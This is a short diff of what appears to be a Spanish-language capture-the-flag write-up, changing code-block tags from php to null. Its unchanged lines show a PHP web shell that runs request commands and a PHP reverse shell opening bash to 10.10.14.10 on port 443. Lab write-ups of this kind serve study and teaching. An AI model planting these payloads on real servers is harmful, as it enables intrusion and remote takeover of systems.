@@ -176,7 +176,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 Pruebo a subir un archivo que me permita una ejecución remota de comandos, pero da un error.
 
-```php
+```null
 <?php
   shell_exec($_REQUEST['cmd']);
 ?>
@@ -281,7 +281,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.10.62 - - [30/Jan/2023 22:48:48] "GET /cmd?cmd=wget.php HTTP/1.0" 404 -
 ```
 
-```php
+```null
 <?php
   system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'");
 ?>
